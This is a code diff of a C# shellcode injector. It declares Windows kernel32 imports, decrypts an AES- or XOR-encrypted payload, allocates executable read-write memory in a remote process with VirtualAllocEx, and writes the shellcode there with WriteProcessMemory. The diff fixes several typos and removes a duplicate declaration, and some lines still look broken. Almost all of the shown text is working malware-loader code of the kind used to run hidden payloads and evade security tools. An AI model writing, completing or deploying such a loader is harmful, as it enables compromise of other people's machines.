@@ -34,10 +34,10 @@
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr WriteProcessMemory(
-            ntPtr hProcess,
+            IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpShellcodeFer,
-            int32 nsize,
+            Int32 nsize,
             out IntPtr lpNumberOfBytesWritten
         );
         [DllImport("kernel32.dll")]
@@ -61,9 +61,6 @@
             UInt32 nndPreferred
         );
 
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
         [DllImport("kernel32.dll")]
         public static extern void Sleep(uint dwMilliseconds);
         // this is for the encryption using xor if you want to use another one like aes256 you need to implement it here
@@ -81,7 +78,7 @@
 
         private static byte[] decAes(byte[] cipher, byte[] key, byte[] iv)
         {
-            using (var aes = aes.Create())
+            using (var aes = Aes.Create())
             {
                 aes.KeySize = 256;
                 aes.Blocksize = 128;
@@ -158,7 +155,7 @@
 
             Console.WriteLine("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { hProcess.ToString("X") });
             // Allocate memory in the remote process
-            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PAGE_EXECUTE_READ_WRITE);
+            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PAGE_RWX);
 
             Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { addr.ToString("X") });
             // Write shellcode[] to the remote process memory
